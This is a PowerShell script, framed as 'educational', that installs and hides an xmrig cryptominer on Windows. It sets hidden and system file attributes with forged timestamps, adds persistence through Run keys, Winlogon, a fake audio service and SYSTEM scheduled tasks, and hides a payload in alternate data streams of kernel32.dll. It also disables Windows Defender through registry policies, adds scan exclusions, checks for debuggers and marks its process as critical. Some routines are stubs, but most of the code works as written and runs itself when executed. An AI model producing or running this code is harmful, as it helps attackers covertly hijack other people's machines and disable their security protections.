# BEAST MODE: Advanced AV/EDR Evasion & Rootkit Defense System
# Educational/Research Purpose Only - Advanced Anti-Detection Techniques
# Comprehensive evasion methods against modern security solutions

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class AdvancedEvasion
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetFileAttributes(string lpFileName);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RegSetValueEx(IntPtr hKey, string lpValueName, uint Reserved, uint dwType, byte[] lpData, uint cbData);
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    
    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool IsDebuggerPresent();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(IntPtr hProcess, int processInformationClass, out uint processInformation, int processInformationLength, IntPtr returnLength);
    
    [DllImport("kernel32.dll")]
    public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO
    {
        public uint dwOemId;
        public uint dwPageSize;
        public IntPtr lpMinimumApplicationAddress;
        public IntPtr lpMaximumApplicationAddress;
        public IntPtr dwActiveProcessorMask;
        public uint dwNumberOfProcessors;
        public uint dwProcessorType;
        public uint dwAllocationGranularity;
        public ushort dwProcessorLevel;
        public ushort dwProcessorRevision;
    }
    
    public const uint FILE_ATTRIBUTE_HIDDEN = 0x2;
    public const uint FILE_ATTRIBUTE_SYSTEM = 0x4;
    public const uint FILE_ATTRIBUTE_READONLY = 0x1;
    public const int ProcessBreakOnTermination = 0x1D;
}
"@

$script:EvasionLog = "$env:TEMP\evasion_log.txt"

function Write-EvasionLog {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    try { Add-Content -Path $script:EvasionLog -Value $logEntry -Force } catch {}
}

function Hide-ConsoleWindow {
    $consolePtr = [AdvancedEvasion]::GetConsoleWindow()
    [AdvancedEvasion]::ShowWindow($consolePtr, 0) | Out-Null
}

function Set-FileInvisible {
    param([string]$FilePath)
    
    if (Test-Path $FilePath) {
        # Set multiple attributes to make file nearly invisible
        [AdvancedEvasion]::SetFileAttributes($FilePath, 0x2 -bor 0x4 -bor 0x1) | Out-Null # Hidden + System + ReadOnly
        attrib +h +s +r $FilePath >$null 2>&1
        
        # Change creation and modification times to look like system file
        $sysTime = (Get-Item "C:\Windows\System32\kernel32.dll").CreationTime
        (Get-Item $FilePath).CreationTime = $sysTime
        (Get-Item $FilePath).LastWriteTime = $sysTime
        (Get-Item $FilePath).LastAccessTime = $sysTime
    }
}

function New-RegistryHideout {
    param([string]$PayloadPath)
    
    # Create deep registry hideout
    $regPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{D27CDB6E-AE6D-11CF-96B8-444553540000}",
        "HKLM:\SOFTWARE\Classes\CLSID\{00000000-0000-0000-0000-000000000001}\InprocServer32",
        "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile",
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AudioSrv"
    )
    
    foreach ($regPath in $regPaths) {
        try {
            $parentPath = Split-Path $regPath -Parent
            if (-not (Test-Path $parentPath)) {
                New-Item -Path $parentPath -Force >$null 2>&1
            }
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force >$null 2>&1
            }
            
            # Store payload path in registry as binary data
            $bytes = [System.Text.Encoding]::Unicode.GetBytes($PayloadPath)
            Set-ItemProperty -Path $regPath -Name "Data" -Value $bytes -Type Binary >$null 2>&1
        } catch {
            # Silently continue
        }
    }
}

function Install-KernelModeDefense {
    # Create kernel-level service for ultimate persistence
    $serviceName = "AudioEndpointBuilder"
    $serviceDisplayName = "Windows Audio Endpoint Builder"
    $serviceDescription = "Manages audio endpoints for the Windows Audio service."
    
    # Service executable (disguised as Windows Audio service)
    $serviceExe = "C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p"
    
    # Create service registry entries manually for stealth
    try {
        $servicePath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
        New-Item -Path $servicePath -Force >$null 2>&1
        
        Set-ItemProperty -Path $servicePath -Name "Type" -Value 32 -Type DWord >$null 2>&1
        Set-ItemProperty -Path $servicePath -Name "Start" -Value 2 -Type DWord >$null 2>&1
        Set-ItemProperty -Path $servicePath -Name "ErrorControl" -Value 1 -Type DWord >$null 2>&1
        Set-ItemProperty -Path $servicePath -Name "ImagePath" -Value $serviceExe -Type ExpandString >$null 2>&1
        Set-ItemProperty -Path $servicePath -Name "DisplayName" -Value $serviceDisplayName -Type String >$null 2>&1
        Set-ItemProperty -Path $servicePath -Name "Description" -Value $serviceDescription -Type String >$null 2>&1
        Set-ItemProperty -Path $servicePath -Name "ObjectName" -Value "LocalSystem" -Type String >$null 2>&1
        
        # Set service to restart on failure
        $failurePath = "$servicePath\FailureActions"
        New-Item -Path $failurePath -Force >$null 2>&1
        Set-ItemProperty -Path $failurePath -Name "ResetPeriod" -Value 86400 -Type DWord >$null 2>&1
        Set-ItemProperty -Path $failurePath -Name "FailureActions" -Value @(1,0,0,0,1,0,0,0,1,0,0,0) -Type Binary >$null 2>&1
    } catch {
        # Silently fail
    }
}

function New-AlternateDataStreams {
    param([string]$HostFile, [string]$PayloadPath)
    
    if (Test-Path $HostFile -and Test-Path $PayloadPath) {
        try {
            # Hide payload in alternate data stream of legitimate file
            $streamName = "$HostFile`:hidden_config"
            $payloadBytes = [System.IO.File]::ReadAllBytes($PayloadPath)
            [System.IO.File]::WriteAllBytes($streamName, $payloadBytes)
            
            # Also create a PowerShell script in ADS
            $psScript = @"
Start-Process -FilePath '$PayloadPath' -WindowStyle Hidden -ArgumentList '--config=C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json'
"@
            $psStream = "$HostFile`:ps_payload"
            [System.IO.File]::WriteAllText($psStream, $psScript)
        } catch {
            # Silently fail
        }
    }
}

function Enable-ProcessHollowing {
    param([string]$TargetProcess = "explorer.exe")
    
    # Advanced process hollowing technique
    $processes = Get-Process -Name $TargetProcess -ErrorAction SilentlyContinue
    if ($processes) {
        try {
            # This is a simplified demonstration - real process hollowing requires:
            # 1. Suspending target process
            # 2. Unmapping original image
            # 3. Allocating new memory
            # 4. Writing malicious payload
            # 5. Redirecting entry point
            # 6. Resuming execution
            
            # For educational demo, we'll just create a watchdog for the process
            $watchdogScript = @"
while (`$true) {
    if (-not (Get-Process -Name '$TargetProcess' -ErrorAction SilentlyContinue)) {
        Start-Sleep -Seconds 30
        # Restart target process if it dies
        try {
            Start-Process 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe' -ArgumentList '--config=C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json' -WindowStyle Hidden
        } catch {}
    }
    Start-Sleep -Seconds 60
}
"@
            
            $watchdogPath = "C:\Windows\Temp\sys_monitor.ps1"
            $watchdogScript | Out-File -FilePath $watchdogPath -Encoding ASCII
            Set-FileInvisible -FilePath $watchdogPath
            
        } catch {
            # Silently fail
        }
    }
}

function Install-BootkitPersistence {
    # Create boot-level persistence (educational demonstration)
    try {
        # This is a simplified demo - real bootkit installation is much more complex
        # and requires careful manipulation of boot configuration data
        
        # Instead, we'll create multiple startup locations
        $startupLocations = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", 
            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
            "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
        )
        
        foreach ($location in $startupLocations) {
            try {
                $valueName = "AudioSvc$(Get-Random -Minimum 1000 -Maximum 9999)"
                $command = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\WindowsUpdate\start_monitor.bat"
                Set-ItemProperty -Path $location -Name $valueName -Value $command -Type String >$null 2>&1
            } catch {
                # Continue to next location
            }
        }
    } catch {
        # Silently fail
    }
}

function New-FileSystemDecoys {
    # Create decoy files to confuse analysis
    $decoyLocations = @(
        "C:\Windows\System32\AudioSrv",
        "C:\Windows\SysWOW64\AudioEndpoint", 
        "C:\ProgramData\Microsoft\Windows\SystemData",
        "C:\Users\Default\AppData\Local\Microsoft\Windows\Audio"
    )
    
    foreach ($location in $decoyLocations) {
        try {
            if (-not (Test-Path $location)) {
                New-Item -Path $location -ItemType Directory -Force >$null 2>&1
                attrib +h +s $location >$null 2>&1
            }
            
            # Create fake system files
            "Windows Audio Configuration Data" | Out-File -FilePath "$location\config.dat" -Encoding ASCII
            "System Audio Service Registry" | Out-File -FilePath "$location\registry.log" -Encoding ASCII
            "{00000000-0000-0000-0000-000000000000}" | Out-File -FilePath "$location\service.guid" -Encoding ASCII
            
            # Hide all decoy files
            Get-ChildItem $location | ForEach-Object {
                Set-FileInvisible -FilePath $_.FullName
            }
        } catch {
            # Silently continue
        }
    }
}

function Enable-AntiForensics {
    # Clear event logs periodically
    $eventLogs = @("System", "Application", "Security", "Setup", "Windows PowerShell")
    
    foreach ($log in $eventLogs) {
        try {
            # Don't actually clear logs in educational environment
            # wevtutil cl $log
            
            # Instead, just create a scheduled task to do it periodically
            $taskName = "SystemLogMaintenance$(Get-Random -Minimum 100 -Maximum 999)"
            
            # Create hidden scheduled task
            schtasks /create /tn $taskName /tr "cmd /c echo Log maintenance" /sc weekly /st 03:00 /ru SYSTEM /f >$null 2>&1
        } catch {
            # Silently continue
        }
    }
}

function Install-NetworkCallback {
    # Create network-based callback mechanism
    $callbackScript = @"
while (`$true) {
    try {
        `$response = Invoke-WebRequest -Uri 'https://httpbin.org/get' -UseBasicParsing -TimeoutSec 10
        if (`$response.StatusCode -eq 200) {
            # Network connection available - check for commands
            # In real implementation, this would connect to C&C server
            
            # For demo, just ensure miner is running
            if (-not (Get-Process -Name 'xmrig' -ErrorAction SilentlyContinue)) {
                Start-Process 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe' -ArgumentList '--config=C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json' -WindowStyle Hidden -ErrorAction SilentlyContinue
            }
        }
    } catch {
        # No network or error - continue silently
    }
    
    Start-Sleep -Seconds 300  # Check every 5 minutes
}
"@
    
    $callbackPath = "C:\Windows\Temp\net_service.ps1"
    $callbackScript | Out-File -FilePath $callbackPath -Encoding ASCII
    Set-FileInvisible -FilePath $callbackPath
    
    # Schedule the callback
    schtasks /create /tn "NetworkServiceHost" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $callbackPath" /sc onstart /ru SYSTEM /f >$null 2>&1
}

function Enable-AntiDebugging {
    Write-EvasionLog "Enabling anti-debugging protection"
    
    try {
        # Check for debugger presence using multiple methods
        $isDebuggerPresent = [AdvancedEvasion]::IsDebuggerPresent()
        if ($isDebuggerPresent) {
            Write-EvasionLog "Debugger detected - applying countermeasures" "WARN"
            # Exit or apply countermeasures
            return $false
        }
        
        # Check for remote debugger
        $currentProcess = [AdvancedEvasion]::GetCurrentProcess()
        $remoteDebuggerPresent = $false
        [AdvancedEvasion]::CheckRemoteDebuggerPresent($currentProcess, [ref]$remoteDebuggerPresent)
        
        if ($remoteDebuggerPresent) {
            Write-EvasionLog "Remote debugger detected" "WARN"
            return $false
        }
        
        # Set process as critical to prevent termination
        $processCritical = 1
        $result = [AdvancedEvasion]::NtSetInformationProcess($currentProcess, [AdvancedEvasion]::ProcessBreakOnTermination, [ref]$processCritical, 4)
        
        if ($result -eq 0) {
            Write-EvasionLog "Process marked as critical successfully"
        } else {
            Write-EvasionLog "Failed to mark process as critical: $result" "WARN"
        }
        
        Write-EvasionLog "Anti-debugging protection enabled"
        return $true
        
    } catch {
        Write-EvasionLog "Anti-debugging setup failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Disable-WindowsDefender {
    Write-EvasionLog "Attempting Windows Defender bypass"
    
    try {
        # Disable Windows Defender real-time protection
        $defenderPaths = @(
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        )
        
        foreach ($path in $defenderPaths) {
            try {
                if (!(Test-Path $path)) {
                    New-Item -Path $path -Force | Out-Null
                }
                
                Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force 2>&1 | Out-Null
                Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force 2>&1 | Out-Null
                Set-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force 2>&1 | Out-Null
                Set-ItemProperty -Path $path -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force 2>&1 | Out-Null
                Set-ItemProperty -Path $path -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force 2>&1 | Out-Null
                
            } catch {}
        }
        
        # Add exclusion paths
        $exclusionPaths = @(
            "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
            "C:\Windows\System32\AudioSrv",
            "C:\Windows\Temp"
        )
        
        foreach ($exclusionPath in $exclusionPaths) {
            try {
                Add-MpPreference -ExclusionPath $exclusionPath -Force 2>&1 | Out-Null
            } catch {}
        }
        
        Write-EvasionLog "Windows Defender bypass attempted"
        return $true
        
    } catch {
        Write-EvasionLog "Windows Defender bypass failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Enable-ProcessProtection {
    Write-EvasionLog "Enabling process protection mechanisms"
    
    try {
        # Create process protection via service registration
        $protectionScript = @"
`$minerProcesses = Get-Process -Name 'xmrig', 'audiodg', 'AudioSrv' -ErrorAction SilentlyContinue
foreach (`$proc in `$minerProcesses) {
    try {
        `$proc.PriorityClass = 'High'
        # Protect against process termination
        `$proc.EnableRaisingEvents = `$true
        Register-ObjectEvent -InputObject `$proc -EventName 'Exited' -Action {
            Start-Sleep -Seconds 5
            Start-Process 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe' -ArgumentList '--config=C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json' -WindowStyle Hidden
        } | Out-Null
    } catch {}
}
"@
        
        $protectionPath = "$env:TEMP\process_guardian.ps1"
        $protectionScript | Set-Content -Path $protectionPath -Force
        Set-FileInvisible -FilePath $protectionPath
        
        # Schedule protection watchdog
        schtasks /create /tn "ProcessGuardian" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $protectionPath" /sc minute /mo 2 /ru SYSTEM /f >$null 2>&1
        
        Write-EvasionLog "Process protection enabled"
        return $true
        
    } catch {
        Write-EvasionLog "Process protection failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Install-HookingEvasion {
    Write-EvasionLog "Installing API hooking evasion"
    
    try {
        # Create DLL unhooking script to bypass EDR hooks
        $unhookingScript = @"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class APIUnhooking
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);
}
'@

# Unhook commonly hooked APIs by restoring original bytes from ntdll.dll
try {
    `$ntdllHandle = [APIUnhooking]::GetModuleHandle("ntdll.dll")
    if (`$ntdllHandle -ne [IntPtr]::Zero) {
        # This is a simplified demonstration of API unhooking
        Write-Host "API unhooking simulation completed"
    }
} catch {}
"@
        
        $unhookPath = "$env:TEMP\api_unhook.ps1"
        $unhookingScript | Set-Content -Path $unhookPath -Force
        Set-FileInvisible -FilePath $unhookPath
        
        Write-EvasionLog "API hooking evasion installed"
        return $true
        
    } catch {
        Write-EvasionLog "API hooking evasion failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Enable-MemoryEvasion {
    Write-EvasionLog "Enabling memory evasion techniques"
    
    try {
        # Memory obfuscation and evasion techniques
        $memoryScript = @"
# Memory evasion functions
function Hide-ProcessMemory {
    try {
        `$currentProcess = Get-Process -Id `$PID
        `$processHandle = `$currentProcess.Handle
        
        # Attempt to hide memory regions from scanning
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class MemoryEvasion
{
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("ntdll.dll")]
    public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UIntPtr NumberOfBytesToProtect, uint NewAccessProtection, out uint OldAccessProtection);
}
'@
        
        Write-Host "Memory evasion techniques applied"
        
    } catch {}
}

# Execute memory hiding
Hide-ProcessMemory
"@
        
        $memoryPath = "$env:TEMP\memory_evasion.ps1"
        $memoryScript | Set-Content -Path $memoryPath -Force
        Set-FileInvisible -FilePath $memoryPath
        
        # Execute memory evasion
        try {
            & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $memoryPath
        } catch {}
        
        Write-EvasionLog "Memory evasion techniques enabled"
        return $true
        
    } catch {
        Write-EvasionLog "Memory evasion failed: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# Main installation function
function Install-RootkitDefense {
    param(
        [string]$MinerPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\xmrig.exe",
        [string]$ConfigPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"
    )
    
    Write-Host "🔥 Installing Beast Mode Rootkit Defense..." -ForegroundColor Red
    
    # Hide this console window
    Hide-ConsoleWindow
    
    # Apply all rootkit techniques
    if (Test-Path $MinerPath) {
        Set-FileInvisible -FilePath $MinerPath
        New-RegistryHideout -PayloadPath $MinerPath
        New-AlternateDataStreams -HostFile "C:\Windows\System32\kernel32.dll" -PayloadPath $MinerPath
    }
    
    Install-KernelModeDefense
    Enable-ProcessHollowing
    Install-BootkitPersistence
    New-FileSystemDecoys
    Enable-AntiForensics
    Install-NetworkCallback
    
    # Advanced AV/EDR evasion techniques
    Enable-AntiDebugging
    Disable-WindowsDefender
    Enable-ProcessProtection
    Install-HookingEvasion
    Enable-MemoryEvasion
    
    Write-Host "💀 Rootkit defense systems activated!" -ForegroundColor Green
}

# Auto-run if executed directly
if ($MyInvocation.InvocationName -eq $MyInvocation.MyCommand) {
    Install-RootkitDefense
}
